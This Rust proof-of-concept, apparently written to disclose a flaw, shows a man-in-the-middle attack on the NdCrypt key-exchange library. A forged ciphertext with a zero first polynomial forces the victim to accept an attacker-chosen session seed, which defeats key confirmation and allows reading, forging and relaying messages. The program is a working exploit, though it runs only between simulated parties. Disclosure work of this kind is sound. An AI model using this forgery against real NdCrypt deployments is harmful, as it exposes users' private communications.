//! NdCrypt MITM PoC — demonstrates that the "key confirmation" does NOT prevent
//! man-in-the-middle attacks, because decapsulation accepts forged ciphertexts.
//!
//! Run:  cargo run --example mitm_poc

use rand::thread_rng;

use NDCrypt::encrypt::{encapsulate_payload, Ciphertext};
use NDCrypt::decrypt::decapsulate_payload;
use NDCrypt::keygen::generate_keypair;
use NDCrypt::gka::{encode_seed, decode_seed, RingElement, ring_multiply, ring_subtract};
use NDCrypt::ndcrypt::{encrypt as nd_encrypt, decrypt as nd_decrypt};
use NDCrypt::params::N;

// ── Constants replicated from the browser client (server.py HTML) ─────────────

const CONFIRM_TAG: &[u8] = b"NDCRYPT-OK"; // 10 bytes, same as JS
const NONCE_CONFIRM_BOB: u64 = 0x80000000; // Bob -> Alice confirmation nonce
const NONCE_CONFIRM_ALICE: u64 = 0x80000001; // Alice -> Bob confirmation nonce

const SEP: &str = "========================================================================";

// ── Helpers ───────────────────────────────────────────────────────────────────

fn zero_poly() -> RingElement {
    RingElement { coeffs: [0u16; N] }
}

fn hex_seed(seed: &[u8; 32]) -> String {
    let mut s = String::new();
    for b in seed {
        s.push_str(&format!("{:02x}", b));
    }
    s
}

fn yes_no(ok: bool) -> &'static str {
    if ok { "YES" } else { "NO" }
}

fn check_confirmation(
    confirm_point: &RingElement,
    seed: &[u8; 32],
    nonce: u64,
    label: &str,
) -> bool {
    match nd_decrypt(confirm_point, seed, nonce) {
        Ok(decoded) => {
            let ok = decoded.len() == CONFIRM_TAG.len()
                && decoded.iter().zip(CONFIRM_TAG.iter()).all(|(a, b)| a == b);
            println!(
                "    [{}] confirmation decrypt -> {:?}  match={}",
                label,
                String::from_utf8_lossy(&decoded),
                yes_no(ok)
            );
            ok
        }
        Err(e) => {
            println!("    [{}] confirmation decrypt FAILED: {:?}", label, e);
            false
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 1 — Normal handshake (control: shows the system works without attack)
// ═══════════════════════════════════════════════════════════════════════════════

fn phase1_normal() {
    println!("\n{}", SEP);
    println!("PHASE 1 - Normal handshake (no attacker, control)");
    println!("{}\n", SEP);

    let mut rng = thread_rng();

    // Alice generates keypair
    let (pk_alice, sk_alice) = generate_keypair(&mut rng);
    println!("  Alice generates Ring-LWE keypair (sk never leaves Alice)");

    // Bob encapsulates a random seed against Alice's public key
    let enc = encapsulate_payload(&pk_alice, &mut rng);
    let bob_seed = *enc.shared_seed;
    let ciphertext = enc.ciphertext;
    println!("  Bob encapsulates random seed: {}", hex_seed(&bob_seed));

    // Alice decapsulates
    let dec = decapsulate_payload(&ciphertext, &sk_alice);
    let alice_seed = *dec.shared_seed;
    println!("  Alice decapsulates       seed: {}", hex_seed(&alice_seed));

    let seeds_match = bob_seed == alice_seed;
    println!("  -> Seeds match: {}", yes_no(seeds_match));

    // Bob sends confirmation
    let bob_confirm = nd_encrypt(CONFIRM_TAG, &bob_seed, NONCE_CONFIRM_BOB).unwrap();
    let bob_ok = check_confirmation(&bob_confirm, &alice_seed, NONCE_CONFIRM_BOB, "Alice verifies Bob");
    println!("  -> Bob's confirmation passes: {}", yes_no(bob_ok));

    // Alice sends confirmation ack
    let alice_confirm = nd_encrypt(CONFIRM_TAG, &alice_seed, NONCE_CONFIRM_ALICE).unwrap();
    let alice_ok = check_confirmation(&alice_confirm, &bob_seed, NONCE_CONFIRM_ALICE, "Bob verifies Alice");
    println!("  -> Alice's confirmation passes: {}", yes_no(alice_ok));

    // Normal message exchange
    let secret_msg = b"meet me at noon";
    let ct = nd_encrypt(secret_msg, &alice_seed, 42).unwrap();
    let pt = nd_decrypt(&ct, &bob_seed, 42).unwrap();
    println!("\n  Alice sends encrypted message (nonce=42)");
    println!("    plaintext:    {:?}", String::from_utf8_lossy(secret_msg));
    println!("    Bob decrypts: {:?}", String::from_utf8_lossy(&pt));
    println!("  -> Message round-trip: {}\n", yes_no(pt == secret_msg));
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 2 — MITM: forged ciphertext (the actual attack)
// ═══════════════════════════════════════════════════════════════════════════════

fn phase2_mitm() {
    println!("\n{}", SEP);
    println!("PHASE 2 - MITM attack: forged ciphertext");
    println!("{}\n", SEP);

    let mut rng = thread_rng();

    // Mallory chooses an arbitrary 32-byte seed — she will force Alice to accept THIS
    let mallory_seed: [u8; 32] = {
        let mut s = [0u8; 32];
        for i in 0..32 {
            s[i] = (0x4D + i) as u8; // 0x4D4E4F50...
        }
        s
    };
    println!("  Mallory picks chosen seed: {}", hex_seed(&mallory_seed));

    // Alice generates her real keypair
    let (_pk_alice, sk_alice) = generate_keypair(&mut rng);
    println!("  Alice generates Ring-LWE keypair");

    // THE ATTACK: Mallory forges a ciphertext
    //
    // Instead of encapsulating against Alice's public key (which would require
    // solving Ring-LWE), Mallory simply constructs:
    //
    //   c1 = 0                    (all-zero polynomial)
    //   c2 = encode_seed(K_M)     (Mallory's chosen seed, encoded publicly)
    //
    // When Alice decapsulates:
    //   c2 - c1 * s = encode_seed(K_M) - 0 * s = encode_seed(K_M)
    //   decode_seed(encode_seed(K_M)) = K_M   (exact, zero noise)
    //
    // Alice's private key s is completely irrelevant — c1=0 cancels it out.

    println!("\n  [!] MALLORY FORGES CIPHERTEXT (no Ring-LWE needed):");
    println!("    c1 = all-zero polynomial (cancels Alice's private key s)");
    println!("    c2 = encode_seed(K_M)    (public encoding of Mallory's seed)");

    let forged_c1 = zero_poly();
    let forged_c2 = encode_seed(&mallory_seed);
    let forged_ct = Ciphertext {
        c1: forged_c1,
        c2: forged_c2,
    };

    // Verify the math: c2 - c1*s should equal encode_seed(K_M) for ANY private key
    let c1_times_s = ring_multiply(&forged_ct.c1, &sk_alice.s_lattice);
    let recovered_poly = ring_subtract(&forged_ct.c2, &c1_times_s);
    let recovered_seed = decode_seed(&recovered_poly);
    println!("\n  Mallory predicts Alice will recover seed: {}", hex_seed(&recovered_seed));
    println!("  Mallory's chosen seed:                     {}", hex_seed(&mallory_seed));
    println!("  -> Prediction correct: {}", yes_no(recovered_seed == mallory_seed));

    // Alice decapsulates the FORGED ciphertext
    let dec = decapsulate_payload(&forged_ct, &sk_alice);
    let alice_seed = *dec.shared_seed;
    println!("\n  Alice decapsulates forged ciphertext -> seed: {}", hex_seed(&alice_seed));
    println!("  -> Alice got MALLORY'S seed: {}", yes_no(alice_seed == mallory_seed));

    // Mallory generates the confirmation tag
    // She knows K_M (she chose it), so she can encrypt CONFIRM_TAG just like Bob would.
    println!("\n  Mallory generates confirmation tag using her known seed K_M:");
    let mallory_confirm = nd_encrypt(CONFIRM_TAG, &mallory_seed, NONCE_CONFIRM_BOB).unwrap();

    // Alice verifies the confirmation
    // Alice uses her recovered seed (which IS K_M) to decrypt the confirmation.
    // It will match CONFIRM_TAG perfectly — the "MITM prevention" is defeated.
    let confirm_ok = check_confirmation(&mallory_confirm, &alice_seed, NONCE_CONFIRM_BOB, "Alice verifies");
    println!("\n  [!] KEY CONFIRMATION PASSES: {}", yes_no(confirm_ok));
    println!("  -> Alice's UI would display: \"E2EE Tunnel Established\"");
    println!("  -> Alice believes she has a quantum-resistant secure channel");
    println!("  -> In reality, Mallory knows the shared secret!");

    // Alice sends her confirmation ack (also under K_M)
    let alice_ack = nd_encrypt(CONFIRM_TAG, &alice_seed, NONCE_CONFIRM_ALICE).unwrap();
    let ack_ok = check_confirmation(&alice_ack, &mallory_seed, NONCE_CONFIRM_ALICE, "Mallory verifies Alice");
    println!("\n  -> Alice's confirmation ack also passes: {}\n", yes_no(ack_ok));

    // ══════════════════════════════════════════════════════════════════════════
    // PHASE 3 — Mallory reads Alice's "encrypted" messages
    // ══════════════════════════════════════════════════════════════════════════

    println!("{}", SEP);
    println!("PHASE 3 - Mallory decrypts Alice's \"encrypted\" messages");
    println!("{}\n", SEP);

    // Alice, thinking she's talking to Bob, encrypts a secret message
    let secret_message = b"the launch code is 8675309";
    let nonce: u64 = 1000;
    let ciphertext_point = nd_encrypt(secret_message, &alice_seed, nonce).unwrap();

    println!("  Alice encrypts secret message (thinking Bob is the recipient):");
    println!("    plaintext:  {:?}", String::from_utf8_lossy(secret_message));
    println!("    nonce:      {}", nonce);
    println!("    ciphertext: [1024 uniform-looking u16 values]");

    // Mallory intercepts the ciphertext point. She knows K_M = alice_seed,
    // so she can derive the same S, same masks, and decrypt perfectly.
    println!("\n  [!] MALLORY INTERCEPTS AND DECRYPTS:");
    let mallory_plaintext = nd_decrypt(&ciphertext_point, &mallory_seed, nonce).unwrap();
    println!("    Mallory decrypts: {:?}", String::from_utf8_lossy(&mallory_plaintext));
    println!("  -> Mallory read the message: {}\n", yes_no(mallory_plaintext == secret_message));

    // ══════════════════════════════════════════════════════════════════════════
    // PHASE 4 — Mallory forges a message that Alice accepts as from "Bob"
    // ══════════════════════════════════════════════════════════════════════════

    println!("{}", SEP);
    println!("PHASE 4 - Mallory forges a message impersonating Bob");
    println!("{}\n", SEP);

    let forged_message = b"send files to m@evil.com";
    let forge_nonce: u64 = 2000;
    let forged_point = nd_encrypt(forged_message, &mallory_seed, forge_nonce).unwrap();

    println!("  Mallory encrypts a fake message using K_M:");
    println!("    forged plaintext: {:?}", String::from_utf8_lossy(forged_message));

    println!("\n  Alice receives and decrypts (thinking it's from Bob):");
    let alice_received = nd_decrypt(&forged_point, &alice_seed, forge_nonce).unwrap();
    println!("    Alice decrypts:   {:?}", String::from_utf8_lossy(&alice_received));
    println!("  -> Alice trusts the forged message: {}\n", yes_no(alice_received == forged_message));

    // ══════════════════════════════════════════════════════════════════════════
    // PHASE 5 — Full bidirectional MITM (Mallory relays between Alice and Bob)
    // ══════════════════════════════════════════════════════════════════════════

    println!("{}", SEP);
    println!("PHASE 5 - Full bidirectional MITM (Alice <-> Mallory <-> Bob)");
    println!("{}\n", SEP);

    // Mallory generates her OWN keypair to intercept Bob's side
    let (pk_mallory, sk_mallory) = generate_keypair(&mut rng);

    // Bob encapsulates against MALLORY's pubkey (he thinks it's Alice's)
    let enc_bob = encapsulate_payload(&pk_mallory, &mut rng);
    let bob_real_seed = *enc_bob.shared_seed;

    // Mallory decapsulates Bob's ciphertext with HER private key -> learns Bob's seed
    let dec_mallory = decapsulate_payload(&enc_bob.ciphertext, &sk_mallory);
    let mallory_bob_seed = *dec_mallory.shared_seed;

    println!("  Bob encapsulates against Mallory's pubkey (thinking it's Alice's):");
    println!("    Bob's seed:             {}", hex_seed(&bob_real_seed));
    println!("    Mallory recovers Bob's: {}", hex_seed(&mallory_bob_seed));
    println!("  -> Mallory knows Bob's seed: {}", yes_no(bob_real_seed == mallory_bob_seed));

    // Mallory forges ciphertext for Alice (as shown in Phase 2)
    let mallory_alice_seed = mallory_seed;
    let forged_for_alice = Ciphertext {
        c1: zero_poly(),
        c2: encode_seed(&mallory_alice_seed),
    };

    // Need a fresh Alice keypair for this scenario
    let (_pk_alice2, sk_alice2) = generate_keypair(&mut rng);
    let alice_dec = decapsulate_payload(&forged_for_alice, &sk_alice2);
    let alice_recovered = *alice_dec.shared_seed;
    println!("\n  Mallory forges ciphertext for Alice:");
    println!("    Alice's seed (Mallory-controlled): {}", hex_seed(&alice_recovered));
    println!("  -> Mallory controls Alice's seed: {}", yes_no(alice_recovered == mallory_alice_seed));

    // Now Mallory has TWO seeds: K_M (with Alice) and K_B (with Bob)
    // She can transparently relay: decrypt from one, re-encrypt for the other
    println!("\n  Mallory now holds BOTH session keys:");
    println!("    Alice <-> Mallory: K_M = {}", hex_seed(&mallory_alice_seed));
    println!("    Mallory <-> Bob:   K_B = {}", hex_seed(&mallory_bob_seed));

    // Alice sends a message to "Bob" (actually Mallory)
    let alice_msg = b"hey bob, pass is hunter2";
    let alice_nonce: u64 = 500;
    let alice_ct = nd_encrypt(alice_msg, &alice_recovered, alice_nonce).unwrap();

    println!("\n  Alice -> \"Bob\":  (encrypted with K_M)");
    println!("    Alice's plaintext: {:?}", String::from_utf8_lossy(alice_msg));

    // Mallory decrypts with K_M
    let mallory_reads = nd_decrypt(&alice_ct, &mallory_alice_seed, alice_nonce).unwrap();
    println!("    Mallory decrypts:  {:?}", String::from_utf8_lossy(&mallory_reads));

    // Mallory re-encrypts with K_B and forwards to Bob
    let bob_nonce: u64 = 500;
    let mallory_relays = nd_encrypt(&mallory_reads, &mallory_bob_seed, bob_nonce).unwrap();

    // Bob decrypts with his seed K_B
    let bob_receives = nd_decrypt(&mallory_relays, &bob_real_seed, bob_nonce).unwrap();
    println!("    Mallory re-encrypts with K_B and forwards to Bob");
    println!("    Bob decrypts:      {:?}", String::from_utf8_lossy(&bob_receives));
    println!("  -> Bob received Alice's message via Mallory: {}", yes_no(bob_receives == alice_msg));

    // Bob replies
    let bob_reply = b"got it, I'll send the files";
    let bob_reply_ct = nd_encrypt(bob_reply, &bob_real_seed, 501).unwrap();

    println!("\n  Bob -> \"Alice\":  (encrypted with K_B)");
    println!("    Bob's plaintext: {:?}", String::from_utf8_lossy(bob_reply));

    // Mallory decrypts with K_B
    let mallory_reads_bob = nd_decrypt(&bob_reply_ct, &mallory_bob_seed, 501).unwrap();
    println!("    Mallory decrypts: {:?}", String::from_utf8_lossy(&mallory_reads_bob));

    // Mallory re-encrypts with K_M and forwards to Alice
    let mallory_relays_to_alice = nd_encrypt(&mallory_reads_bob, &mallory_alice_seed, 501).unwrap();
    let alice_receives = nd_decrypt(&mallory_relays_to_alice, &alice_recovered, 501).unwrap();
    println!("    Mallory re-encrypts with K_M and forwards to Alice");
    println!("    Alice decrypts:  {:?}", String::from_utf8_lossy(&alice_receives));
    println!("  -> Alice received Bob's reply via Mallory: {}\n", yes_no(alice_receives == bob_reply));

    // ══════════════════════════════════════════════════════════════════════════
    // SUMMARY
    // ══════════════════════════════════════════════════════════════════════════

    println!("{}", SEP);
    println!("SUMMARY");
    println!("{}\n", SEP);
    println!("  1. Mallory forges c1=0, c2=encode_seed(K_M) -> Alice decapsulates K_M");
    println!("     (no Ring-LWE computation needed - Alice's private key is irrelevant)");
    println!("  2. Mallory generates the confirmation tag using K_M -> Alice verifies OK");
    println!("     (the \"MITM prevention\" key confirmation is completely defeated)");
    println!("  3. Alice's UI says \"E2EE Tunnel Established\" - but Mallory knows the key");
    println!("  4. Mallory decrypts all of Alice's messages");
    println!("  5. Mallory forges messages impersonating Bob");
    println!("  6. Full bidirectional relay: Alice <-> Mallory <-> Bob");
    println!();
    println!("  Root cause: decapsulate_payload() has NO ciphertext validation.");
    println!("  It accepts any (c1, c2) pair and decodes whatever polynomial");
    println!("  c2 - c1*s reduces to - including attacker-chosen values.");
    println!();
    println!("  The fix is NOT to patch this. Use standard audited crypto:");
    println!("    - ML-KEM (Kyber) / X25519 for key exchange");
    println!("    - HKDF for key derivation");
    println!("    - AES-GCM or ChaCha20-Poly1305 for authenticated encryption");
    println!("    - Signatures / fingerprint verification for MITM resistance");
}

fn main() {
    println!("\n+----------------------------------------------------------------------+");
    println!("|     NdCrypt MITM Proof-of-Concept - Chosen-Seed Forgery              |");
    println!("|  Demonstrates: forged ciphertext -> confirmation passes -> full MITM |");
    println!("+----------------------------------------------------------------------+");

    phase1_normal();
    phase2_mitm();
}
